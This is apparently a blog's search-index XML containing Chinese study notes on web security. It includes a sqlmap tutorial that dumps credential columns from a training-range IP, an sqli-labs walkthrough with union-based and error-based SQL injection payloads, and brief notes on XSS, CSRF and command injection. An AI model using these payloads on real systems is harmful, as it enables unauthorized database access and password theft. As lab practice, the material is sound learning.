<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python学习</title>
      <link href="/2019/09/17/python%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/09/17/python%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> python学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Struts2框架学习</title>
      <link href="/2019/09/15/Struts2%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/09/15/Struts2%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是Struts2框架："><a href="#什么是Struts2框架：" class="headerlink" title="什么是Struts2框架："></a>什么是Struts2框架：</h1><p><strong>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts2是Struts1的下一代产品，这个框架充分发挥了Struts1和WebWork这两种技术的优势，抛弃原来Struts1的缺点，使得Web开发更加容易。</strong></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaweb框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap的使用教程</title>
      <link href="/2019/09/14/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2019/09/14/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>最近在学习一些工具的使用，接下来会每一天都更新博客，记录自己的日常收获。</p><a id="more"></a><h2 id="sqlmap使用方式："><a href="#sqlmap使用方式：" class="headerlink" title="sqlmap使用方式："></a><strong>sqlmap使用方式：</strong></h2><pre class=" language-sql"><code class="language-sql">Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"目标url"</span> 其他参数Python sqlmap<span class="token punctuation">.</span>py <span class="token comment" spellcheck="true">--url="目标url" 其他参数</span>Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u test<span class="token punctuation">.</span>txt 其他参数</code></pre><p>目标站点：<a href="http://219.153.49.228:46683/new_list.php?id=1" target="_blank" rel="noopener">http://219.153.49.228:46683/new_list.php?id=1</a></p><h3 id="检查注入点："><a href="#检查注入点：" class="headerlink" title="检查注入点："></a><strong>检查注入点：</strong></h3><pre class=" language-sql"><code class="language-sql">Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1</span><span class="token comment" spellcheck="true">--也可以先进行手工注入，判断出注入点</span></code></pre><h3 id="爆出所有数据库信息："><a href="#爆出所有数据库信息：" class="headerlink" title="爆出所有数据库信息："></a><strong>爆出所有数据库信息：</strong></h3><pre class=" language-sql"><code class="language-sql">Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 --dbs</span></code></pre><h3 id="爆当前数据库信息："><a href="#爆当前数据库信息：" class="headerlink" title="爆当前数据库信息："></a><strong>爆当前数据库信息：</strong></h3><pre class=" language-sql"><code class="language-sql">Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 --current-db</span></code></pre><h3 id="指定库名列出所有表："><a href="#指定库名列出所有表：" class="headerlink" title="指定库名列出所有表："></a><strong>指定库名列出所有表：</strong></h3><pre class=" language-sql"><code class="language-sql">Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 -D 库名 --tables</span></code></pre><h3 id="指定库名表名列出所有字段："><a href="#指定库名表名列出所有字段：" class="headerlink" title="指定库名表名列出所有字段："></a><strong>指定库名表名列出所有字段：</strong></h3><pre class=" language-sql"><code class="language-sql">Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 -D 库名 -T 表名 --columns</span></code></pre><h3 id="指定库名表名dump出指定字段："><a href="#指定库名表名dump出指定字段：" class="headerlink" title="指定库名表名dump出指定字段："></a><strong>指定库名表名dump出指定字段：</strong></h3><pre class=" language-sql"><code class="language-sql">Python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 -D 库名 -T 表名 -C id,name,password --dump</span></code></pre><h3 id="实操："><a href="#实操：" class="headerlink" title="实操："></a>实操：</h3><p><strong>目标url:</strong> <a href="http://219.153.49.228:46683/new_list.php?id=1" target="_blank" rel="noopener"> http://219.153.49.228:46683/new_list.php?id=1</a></p><p><strong>判断注入点：</strong></p><p>经过手工注入发现 and 1=1 和 and 1=2 返回的页面不同，那么我就知道了在id 这里存在了注入点。也可以在sqlmap中判断是否是可以注入的。</p><pre class=" language-sql"><code class="language-sql">python sqlmap <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1</span></code></pre><p><img src="/2019/09/14/sqlmap的使用教程/1.png" alt></p><p><img src="/2019/09/14/sqlmap的使用教程/2.png" alt></p><p><strong>爆出所有数据库信息：</strong></p><pre class=" language-sql"><code class="language-sql">python sqlmap <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 --dbs</span></code></pre><p><img src="/2019/09/14/sqlmap的使用教程/3.png" alt></p><p><strong>爆当前数据库信息：</strong></p><pre class=" language-sql"><code class="language-sql">python sqlmap <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 --current-db</span></code></pre><p><img src="/2019/09/14/sqlmap的使用教程/4.png" alt></p><p><strong>指定库名列出所有表：</strong></p><pre class=" language-sql"><code class="language-sql">python sqlmap <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 -D mozhe_Discuz_StormGroup --tables</span></code></pre><p><img src="/2019/09/14/sqlmap的使用教程/5.png" alt></p><p><strong>指定库名表名列出所有字段：</strong></p><pre class=" language-sql"><code class="language-sql">python sqlmap <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 -D mozhe_Discuz_StormGroup -T StormGroup_member --columns</span></code></pre><p><img src="/2019/09/14/sqlmap的使用教程/6.png" alt></p><p><strong>指定库名表名dump出指定字段：</strong></p><pre class=" language-sql"><code class="language-sql">python sqlmap <span class="token operator">-</span>u http:<span class="token comment" spellcheck="true">//219.153.49.228:46683/new_list.php?id=1 -D mozhe_Discuz_StormGroup -T StormGroup_member -C id,name,password --dump</span></code></pre><p><img src="/2019/09/14/sqlmap的使用教程/7.png" alt></p><p>日后更新！！</p>]]></content>
      
      
      <categories>
          
          <category> sqlmap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>判断是否为整形注入</title>
      <link href="/2019/06/05/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA%E6%95%B4%E5%BD%A2%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/06/05/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA%E6%95%B4%E5%BD%A2%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p><strong>为了记录自己，以后避免遗忘！</strong></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>sql的注入过程中，如何判断整形注入？sqli-labs的Less-2就是一个典型的整形注入，</p><a id="more"></a><p>1，输入单引号，页面报错</p><pre><code>http://127.0.0.1/sqli-labs/Less-2/?id=1&#39;</code></pre><p><img src="/2019/06/05/判断是否为整形注入/2.png" alt></p><p>这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p><p>2，输入下面的，页面正常回显</p><pre><code>http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=1 --+</code></pre><p><img src="/2019/06/05/判断是否为整形注入/1.png" alt></p><p>因为and 1=1为真，语句执行成功。</p><p>3，输入下面的，页面不报错，但是无法查询出来数据，</p><pre><code>http://127.0.0.1/sqli-labs/Less-2/?id=1 and 1=2 --+</code></pre><p><img src="/2019/06/05/判断是否为整形注入/3.png" alt></p><p>符合上述的，就为整形注入！</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs通关详解</title>
      <link href="/2019/06/03/sqli-labs%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/06/03/sqli-labs%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><img src="/2019/06/03/sqli-labs通关详解/title.jpg" alt><a id="more"></a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很开心自己可以再次的学习sql注入，自己总是嘴上说写，但是也没实际的付出行动，导致了现在弄啥都有点懵，现在发现对待任何一件事情都要认真，不要半途就放弃了。当你要重拾它的时候，就需要付出很多的时间，还有不要相信自己的记忆力，一定要做记录！</p><h2 id="sql注入的知识点："><a href="#sql注入的知识点：" class="headerlink" title="sql注入的知识点："></a>sql注入的知识点：</h2><p>先判断哪里存在注入，注入的类型是，然后就判断有几列，找到可以回显的点，进一步的判断数据库名，表名，和表中的数据。</p><h3 id="Less-1-单引号注入-："><a href="#Less-1-单引号注入-：" class="headerlink" title="Less-1(单引号注入)："></a>Less-1(单引号注入)：</h3><p>打开输入?id=1,发现是这个样子</p><p><img src="/2019/06/03/sqli-labs通关详解/1.png" alt></p><p>判断注入的类型，闭合sql语句，找到正确的注入类型会报错，但是加上sql的注释就会恢复</p><p><img src="/2019/06/03/sqli-labs通关详解/2.png" alt></p><p><img src="/2019/06/03/sqli-labs通关详解/3.png" alt></p><p>发现是单引号注入，判断有几列，一般用二分法来判断，order  by 加上你猜测的数字，经过判断发现有3列</p><blockquote><p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</a> order by   3 –+</p></blockquote><p><img src="/2019/06/03/sqli-labs通关详解/4.png" alt></p><p>然后判断回显的点用,2和3可以。</p><pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,3 --+</code></pre><p><img src="/2019/06/03/sqli-labs通关详解/5.png" alt></p><p>接下来判断数据库名，数据库版本，和使用者，先介绍一下concat(),连接字符串，concat_ws(),加一个符号用于分割数据，group_concat</p><p><img src="/2019/06/03/sqli-labs通关详解/7.png" alt></p><p><img src="/2019/06/03/sqli-labs通关详解/6.png" alt></p><pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,concat_ws(char(32,32),database(),version(),user()) --+</code></pre><p>user():返回当前数据库连接使用的用户</p><p>database():返回当前数据库连接使用的数据库</p><p>version():返回当前数据库的版本<img src="/2019/06/03/sqli-labs通关详解/8.png" alt></p><pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,concat_ws(char(32,32),database(), --+</code></pre><p>开始查看表名</p><pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code></pre><p>这时我们就要用的limit了， 第一个参数是结果集中的第几个，跟C语言的数组的索引一致，第二个参数就是个数</p><p>如 limit  1,2  :返回第二行和第三行，因为1表示是第二行，2表示行数是2</p><p>也可以一次性的查询出来用group_concat()进行查询表名。</p><pre><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code></pre><p><img src="/2019/06/03/sqli-labs通关详解/9.png" alt></p><p>不停的改变limit的第一个参数，得到4张表，分别是 emails,referers,uagents,users,对我们有用的是 users这张表。查看表中的列名</p><pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1 --+</code></pre><p>可以一次性的查询列名用group_concat,对列名进行查询</p><pre><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+</code></pre><p><img src="/2019/06/03/sqli-labs通关详解/10.png" alt></p><p>不停的改变limit的第一个参数，得到3列，分别是 id,username,password现在就可以去获取数据了</p><pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,concat_ws(char(32,32,32),id,username,password) from users limit 0,1 --+</code></pre><p>同理，对id,username,password,这些数据进行一次性查询</p><pre><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(id,username,password) from users--+或者http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,group_concat(username),group_concat(password) from users--+</code></pre><p><img src="/2019/06/03/sqli-labs通关详解/11.png" alt></p><p>不停的改变limit的第一个参数，就可以查看数据了</p><h3 id="Less-2-整形注入-："><a href="#Less-2-整形注入-：" class="headerlink" title="Less-2(整形注入)："></a>Less-2(整形注入)：</h3><p>首先找到注入点，然后其他的步骤就和第一关一样了，尝试了几次，发现就是整形注入。</p><h3 id="Less-3-单引号变形注入-："><a href="#Less-3-单引号变形注入-：" class="headerlink" title="Less-3(单引号变形注入)："></a>Less-3(单引号变形注入)：</h3><p>先找到注入点，<code>首先输入单引号</code>、发现有报错提醒，<img src="/2019/06/03/sqli-labs通关详解/blog\source\_posts\sqli-labs通关详解\12.png" alt></p><p>报错消息，为</p><pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code></pre><p>外面的两个单引，是对字符串的包裹，‘1’‘）没法对字符串进行闭合，加上单引号就可以了</p><p><img src="/2019/06/03/sqli-labs通关详解/13.png" alt></p><p>接下来就可以进行常规操作了，就可以获取数据了。</p><h3 id="Less-4-双引号变形注入-："><a href="#Less-4-双引号变形注入-：" class="headerlink" title="Less-4(双引号变形注入)："></a>Less-4(双引号变形注入)：</h3><p>先找到注入点，<code>首先输入单引号</code>、发现没有报错提醒，那我们就输入双引号，发现出现了和上一题一样的报错提醒，那就是和上一题一样的步骤就行了。</p><h3 id="Less-5-双查询单引号注入-："><a href="#Less-5-双查询单引号注入-：" class="headerlink" title="Less-5(双查询单引号注入)："></a>Less-5(双查询单引号注入)：</h3><p>这道题可以用双查询注入，我们来一起学习一下双查询注入。</p><p>双注入的原理，简单一句话原理就是有研究人员发现，<strong>当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</strong></p><p>加黑字体是全文中最总要的一句话，一定要好好记住！！</p><p>这种方法方法通常用于注入的时候没有返回位。</p><pre><code>函数说明：rand()是一个生成随机数的函数，他会返回0到1之间到一个值。floor()是取整函数了，童鞋们应该都很熟悉了。count()是一个聚合函数，用户返回符合条件的记录数量。</code></pre><p>大概说一下它固定的格式</p><pre><code>select count(*),concat_ws(&#39;:&#39;,([子查询],floor(rand()*2))) as a form [table_name] group by a;</code></pre><p>嘿咻嘿咻，我在研究双注入的时候看到了一篇文章对我的帮助特别大，特此奉献出地址  <a href="http://www.91ri.org/7636.html" target="_blank" rel="noopener">http://www.91ri.org/7636.html</a></p><p>主要就是说，通过报错的形式查出你所想要查的东西，至于为何会是这种固定的格式呢因为 <strong><em>当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来</em></strong>，把它分组，清晰明了</p><p>不信请看</p><pre><code>select concat((select version()),floor(rand()*2))  from information_schema.tables;</code></pre><p><img src="/2019/06/03/sqli-labs通关详解/14.png" alt></p><p>这么多的数据，我们分组来看看</p><pre><code>select concat((select version()),floor(rand()*2)) as a from information_schema.tables group by a;</code></pre><p><img src="/2019/06/03/sqli-labs通关详解/15.png" alt></p><p>这样就清晰明了很多了，我们通过报错来获取我们想要的信息。</p><p>这是在navicat里面进行的查询。</p><p><img src="/2019/06/03/sqli-labs通关详解/16.png" alt></p><p>接下来，我们就进入正题，来写一下这道题是如何做的？</p><p>发现输入？id=1，会出现，you are in…….</p><p>输入 ？id=1’ 会报错，那么是因为把1‘带入了sql语句中进行了查询，格式不对报的错。就说明没有回显，我们就用双查询注入做，其实还可以用其他的报错注入做，或者盲注。</p><p>查询数据库版本，数据库名字</p><p><img src="/2019/06/03/sqli-labs通关详解/17.jpg" alt></p><p><img src="/2019/06/03/sqli-labs通关详解/18.jpg" alt></p><p>然后和往常一样查询表名，列名，从而猜解字段名。就不一一的写了</p><pre><code>查询有几张表:http://127.0.0.1/sqli-labs/Less-5/?id=-1&#39; union select 1,count(*),concat((select count(table_name) from information_schema.tables where table_schema=&#39;security&#39; ),&#39;~~&#39;,floor(rand()*2)) as a from  information_schema.tables group by a --+查询表名:http://127.0.0.1/sqli-labs/Less-5/?id=-1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;~~&#39;,floor(rand()*2)) as a from  information_schema.tables group by a --+</code></pre><p>发现有四张表：emails,referers,uagents,users,</p><pre><code>查users表中的数据http://127.0.0.1/sqli-labs/Less-5/?id=-1&#39; union select 1,count(*),concat((select count(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),&#39;~~&#39;,floor(rand()*2)) as a from  information_schema.tables group by a --+</code></pre><p>有3个字段：id,username,password</p><pre><code>查users表中的用户名：http://127.0.0.1/sqli-labs/Less-5/?id=-1&#39; union select 1,count(*),concat((select username from users limit 0,1),&#39;~~&#39;,floor(rand()*2)) as a from  information_schema.tables group by a --+查每个用户民对应的密码：http://127.0.0.1/sqli-labs/Less-5/?id=-1&#39; union select 1,count(*),concat((select password from users where username=&#39;Dumb&#39;),&#39;~~&#39;,floor(rand()*2)) as a from  information_schema.tables group by a --+</code></pre><p><font size="6" color="red">总结</font>:</p><p>恰好也发现了这种注入方式中子查询若使用group_concat()函数无法触发报错!</p><h3 id="Less-6-双查询双引号注入-："><a href="#Less-6-双查询双引号注入-：" class="headerlink" title="Less-6(双查询双引号注入)："></a>Less-6(双查询双引号注入)：</h3><p>​    这道题和第五题一样，只不过是双引号。</p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7():"></a>Less-7():</h3>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全</title>
      <link href="/2019/04/29/web%E5%AE%89%E5%85%A8/"/>
      <url>/2019/04/29/web%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="web基础知识"><a href="#web基础知识" class="headerlink" title="web基础知识"></a>web基础知识</h3><p><img src="/2019/04/29/web安全/url.png" alt></p><a id="more"></a><p><strong>注意</strong>：？<strong>传送的是数据</strong></p><p>http报文：<img src="web安全\http.jpg" alt></p><p>http请求的方式很多：有head,put,delete,options,get,post</p><p>referer:告知请求的来源</p><p>http响应头，请求头。</p><p>cookie？set-cookie?location?</p><p>web工作流程</p><p>dns解析，html ,ja css,</p><p>html——》htmldom</p><p>alert()</p><p>comfirm</p><p>prompt</p><p>cookie</p><p>document.cookie</p><p>web服务端</p><p>wapy</p><p>mysql服务：</p><p>hosts</p><p>sql：</p><p>注释：– …这个后面有个空格</p><p>​                #….  </p><p>//<em>……../</em>/</p><p>select database();</p><p>显示当前使用的数据库</p><p>select current_user;</p><p>显示当前的用户</p><p>select load_file(路径)；</p><p>select version（）；版本</p><p>php</p><p>变量：$变量名</p><p>串接：.点</p><p>变量的大小写是敏感的</p><p>$_post[“name”]</p><p>$_get[“name”]</p><p>post,get接收传值</p><p>$_request</p><p>钓鱼网站，被篡改的网站</p><p>hacked by</p><p>搜索引擎语法：</p><p>intitle:keyword 标题中含有关键词的网页</p><p>intext：keyword 正文中含有关键字的网页</p><p>site:domain 在某个域名和子域名下的网页</p><p>暗链：</p><p>xss漏洞：是一种通过对前端页面的注入</p><p>cookie</p><p>存储型</p><p>反射型：可以在url上看到xss,</p><p>dom型：可以在url上看到xss,通过firebug看，f12看不到</p><p>csrf：跨站请求网站，利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。</p><p>点击劫持:隐蔽性比较高，主要利用</p><p>iframe标签：</p><p>url跳转：</p><p>sql注入：闭合，注释 ‘  –</p><p>命令注入：cmd 中可以通过 find 命令在指定的文件中 查找指定的字符串</p><p>find “hello” ./test.txt</p><p>net  user 可以显示用户</p><p>echo hello &amp; echo word</p><p>打印hello 和 word</p><p>命令拼接：</p><p><img src="/2019/04/29/web安全/123.png" alt></p><p>管道符：前面命令的输出作为后面命令的输入</p><p>非常危险的命令</p><p>文件包含：本地文件包含，远程文件包含（通过发送http请求或其他请求来获得远程文件）</p><p>index.php</p><p>admin.php</p><p>重复的代码，放到一个文件里面</p><p>allow_url_fopen = on （是否允许打开远程文件）</p><p>allow_url_include = on （是否允许包含远程文件）</p><p>sqlmap - 一个单词</p><p>– 单词全拼</p><p>–dbs 查询数据库</p><p>–users 查询当前用户</p><p>–current-user </p><p>–current-db</p><p>查询当前用户，查询当前数据库</p><p>–tables -D “查询到的数据库”  查询当前数据库中的表</p><p>–columns -T “查询的表名” -D “数据库名”  查询当前表中的列</p><p>–count -T “查询的表名” -D “数据库名”   查询当前表中有多少条数据</p><p>–dump -T “查询的表名” -D “数据库名”   查询当前表中的数据</p><p>–dump -T “查询的表名” -D “数据库名”   –start 2 –stop 3 查询当前表中的数据从第二条开始到第三条结束</p><p>–dump-all -D “数据库名” 查询本数据库中的所有内容</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali开启ssh服务连接finalshell</title>
      <link href="/2019/04/25/kali%E5%BC%80%E5%90%AFssh%E6%9C%8D%E5%8A%A1%E8%BF%9E%E6%8E%A5finalshell/"/>
      <url>/2019/04/25/kali%E5%BC%80%E5%90%AFssh%E6%9C%8D%E5%8A%A1%E8%BF%9E%E6%8E%A5finalshell/</url>
      
        <content type="html"><![CDATA[<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><pre><code>vim /etc/ssh/sshd_config</code></pre><p><img src="/2019/04/25/kali开启ssh服务连接finalshell/11.png" alt="11"></p><p>主要就是修改黄色字体的那两项</p><a id="more"></a><h3 id="开启ssh服务"><a href="#开启ssh服务" class="headerlink" title="开启ssh服务"></a>开启ssh服务</h3><pre><code>service ssh start</code></pre><h3 id="查看ssh当前状态"><a href="#查看ssh当前状态" class="headerlink" title="查看ssh当前状态"></a>查看ssh当前状态</h3><pre><code>service sshd status</code></pre><p><img src="/2019/04/25/kali开启ssh服务连接finalshell/12.jpg" alt="12"></p><h3 id="开机自启ssh服务"><a href="#开机自启ssh服务" class="headerlink" title="开机自启ssh服务"></a>开机自启ssh服务</h3><pre><code>update-rc.d ssh enable</code></pre><p>然后就可以开心的用finalshell 进行远程操作了</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
